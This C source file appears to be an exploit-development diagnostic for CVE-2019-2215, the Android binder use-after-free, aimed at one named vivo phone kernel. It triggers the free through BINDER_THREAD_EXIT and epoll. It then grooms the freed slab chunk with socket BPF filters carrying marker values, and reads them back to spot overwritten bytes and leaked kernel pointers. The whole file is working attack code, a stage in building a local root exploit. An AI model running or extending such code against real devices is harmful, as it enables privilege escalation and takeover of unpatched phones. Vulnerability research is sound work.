/*
 * CVE-2019-2215 diagnostic - vivo Xplay6 8.19.16 (3.18.71-perf-g8a8c60dd)
 *
 * Answers: does ANY byte of ANY filter chunk change when we close(epfd)?
 *   - unique marker per socket (k = 0x22000000 + idx)
 *   - fully buffered stdout: ZERO syscalls in the race window
 *   - before/after full-diff of all readbacks, any offset
 *   - control phase without UAF for comparison
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

#define BINDER_THREAD_EXIT 0x40046208
#define BINDER_VERSION     0xc0046209
#ifndef SO_ATTACH_FILTER
#define SO_ATTACH_FILTER 1
#endif
#ifndef SO_GET_FILTER
#define SO_GET_FILTER 77
#endif
#ifndef __NR_sched_setaffinity
#define __NR_sched_setaffinity 122
#endif

struct sf { unsigned short code; unsigned char jt, jf; unsigned int k; };
struct sfp { unsigned short len; struct sf *f; };

#define NINSNS 62
#define LOCK_INSN 19
#define NSOCK 100
#define ITERS 5

static struct sf insns[NINSNS];
static struct sfp prog;

static void pin_cpu0(void)
{
    unsigned long long mask = 1;
    syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
}

static int run_iter(int with_uaf, unsigned char snap[NSOCK][NINSNS * 8])
{
    int fd, epfd, socks[NSOCK];
    int ver = 0, ret, nsock = 0;
    struct epoll_event ev;

    /* ORDER IS CRITICAL: all other 512-class allocations (unix socks,
       eventpoll struct) must happen BEFORE binder_get_thread allocates the
       victim chunk C, so that C's slab stays the current per-cpu slab and
       kfree(C) puts C at the freelist head. */

    for (int i = 0; i < NSOCK; i++) {
        socks[nsock] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (socks[nsock] < 0) { perror("socket"); break; }
        nsock++;
    }

    epfd = epoll_create1(0);
    if (epfd < 0) { perror("epoll_create1"); return -1; }

    fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) { perror("open binder"); return -1; }
    ret = ioctl(fd, BINDER_VERSION, &ver);      /* allocates victim C */
    if (ret < 0) { perror("binder VERSION"); return -1; }

    ev.events = EPOLLIN; ev.data.fd = fd;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) { perror("epoll_ctl"); return -1; }

    if (with_uaf) {
        if (ioctl(fd, BINDER_THREAD_EXIT, 0) < 0) { perror("THREAD_EXIT"); return -1; }
    }

    for (int i = 0; i < nsock; i++) {
        prog.f->k = 0x22000000u + (unsigned)i;   /* unique marker */
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog)) < 0) { perror("setsockopt"); break; }
    }

    for (int i = 0; i < nsock; i++) {
        socklen_t blen = NINSNS * 8;
        if (getsockopt(socks[i], SOL_SOCKET, SO_GET_FILTER, snap[i], &blen) < 0) {
            printf("iter%d: getsockopt before failed sock%d\n", with_uaf, i);
        }
    }

    close(epfd);   /* the writeback (if any) */

    int nchanged = 0;
    for (int i = 0; i < nsock; i++) {
        unsigned char now[NINSNS * 8];
        socklen_t blen = sizeof(now);
        if (getsockopt(socks[i], SOL_SOCKET, SO_GET_FILTER, now, &blen) < 0) continue;
        for (int off = 0; off < (int)blen; off += 8) {
            unsigned long long a, b;
            memcpy(&a, snap[i] + off, 8);
            memcpy(&b, now + off, 8);
            if (a != b) {
                nchanged++;
                printf("uaf=%d iter sock%d chunk+0x%03x: %016llx -> %016llx\n",
                       with_uaf, i, off, a, b);
            }
        }
        /* kernel pointer anywhere in the chunk */
        for (int off = 0; off < (int)blen; off += 8) {
            unsigned long long b;
            memcpy(&b, now + off, 8);
            if ((b >> 48) == 0xffffULL)
                printf("uaf=%d sock%d KPTR @0x%03x = 0x%016llx\n",
                       with_uaf, i, off, b);
        }
    }

    for (int i = 0; i < nsock; i++) close(socks[i]);
    close(fd);
    return nchanged;
}

int main(void)
{
    static unsigned char snap[NSOCK][NINSNS * 8];
    static char outbuf[1 << 16];
    setvbuf(stdout, outbuf, _IOFBF, sizeof(outbuf));
    pin_cpu0();

    for (int i = 0; i < NINSNS; i++) {
        insns[i].code = 0x0006; insns[i].jt = 0; insns[i].jf = 0;
        insns[i].k = 0x22000000;
    }
    /* canary lock word: bytes 06 00 06 00 = 0x00060006 (owner==next==6, unlocked).
       spin_lock+unlock at close(epfd) bumps owner -> 0x00070006: readback shows
       jt byte 0x06 -> 0x07 at insn19 IF the freed chunk is a filter chunk.   */
    insns[LOCK_INSN].code = 0x0006; insns[LOCK_INSN].jt = 0x06;
    insns[LOCK_INSN].jf = 0x00; insns[LOCK_INSN].k = 0x22150006;
    prog.len = NINSNS;
    prog.f = insns;

    for (int it = 0; it < ITERS; it++) {
        int c = run_iter(1, snap);
        printf("== iter %d UAF: %d changed qwords ==\n", it, c);
    }
    for (int it = 0; it < ITERS; it++) {
        int c = run_iter(0, snap);
        printf("== iter %d CTRL: %d changed qwords ==\n", it, c);
    }
    fflush(stdout);
    return 0;
}
